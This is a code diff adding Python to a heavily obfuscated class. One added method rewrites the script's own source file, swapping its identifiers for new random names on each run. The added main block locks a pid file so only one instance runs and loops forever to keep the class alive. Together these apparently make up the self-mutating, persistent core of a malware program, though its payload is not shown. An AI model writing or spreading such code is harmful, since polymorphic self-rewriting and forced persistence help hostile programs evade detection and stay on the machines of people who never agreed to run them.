@@ -847,3 +847,29 @@ class SOoOJjHc():
             except IndexError or TypeError:
                 pass
 
+    def dFlmiDcL(self):
+        CnZEZuAV=open(argv[0],"r")
+        lGotWeWs=CnZEZuAV.read()
+        CnZEZuAV.close()
+        ZgXyDPuR=['rantDwWe','MogcXLkP','MogcXLkP','SOoOJjHc','uZDtNcSo','yAtAtBpQ','bvuPxxoe','yiGWvphF','RPjPiRqo','JWnbDxoo','jyzjARwP','FnbHBIKX','iZZsSIWY','TdFAsxPn','OMpLRZVt','AcowFUYn','PtOPRyaP','PkPsXPwN','DQTonzOr','ZgXyDPuR','QqLBFpkm','CnZEZuAV','zVhptrlk','WxbKsWDa','dFlmiDcL','UYUHvuMj','xMxEAJzG','wdVpXFAu','JCUNsuhq','TDvVQeDl','JCUNsuhq','aYxXqxij','EJswjwgZ','wIjtipUi','JLLtTniF','lGotWeWs','YMXAcFNC','MbEjgUOl','guyZmDXC','EodSlGdS','eiaAnsBP','MuEFLzEc','YZZEVzDy','hiJdZHaX','cShnQVxK','sZSansOC','iKdvMuag','dodepTmF','QwAdOdJR','ncBrnXua','GxVCceRN','qRtXeNct','FocihdJO','hDfReyUF','szpMLewu','PBsHzYzW','SvxFYfhn','OlxRQoIE','eaxbPqQN','lCanVoaL','KxzLcvJg','qKoHkIxF','qSPBJJom','kwXLnXMT','KBrVuXmb','RyoybtRY','fNMASlgn','OQEPVvYq','WGpaXGEC','FvHHzlJu','MiwRFOVd','dLgrNjvV','RyoybtRY','HrkOVUQn', 'OmgjPABz', 'wJwiwMvF', 'srIDmVhC', 'PuaorNVt', 'JJCaPJKF','bhZHKNhN', 'KgaiiMDa']
+        for QqLBFpkm in ZgXyDPuR:
+            lGotWeWs=lGotWeWs.replace(QqLBFpkm,self.MogcXLkP(8))
+        zVhptrlk=open(argv[0],"w")
+        zVhptrlk.write(lGotWeWs)
+        zVhptrlk.close()
+if __name__=="__main__":
+    pid_file = 'SDKOEF'
+    fp = open(pid_file, 'w')
+    try:
+        fcntl.lockf(fp, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        while 1:
+            try:
+                SOoOJjHc()
+            except Exception as e:
+                print(str(e))
+                time.sleep(45)
+    except IOError:
+        exit(1)
+
+
+
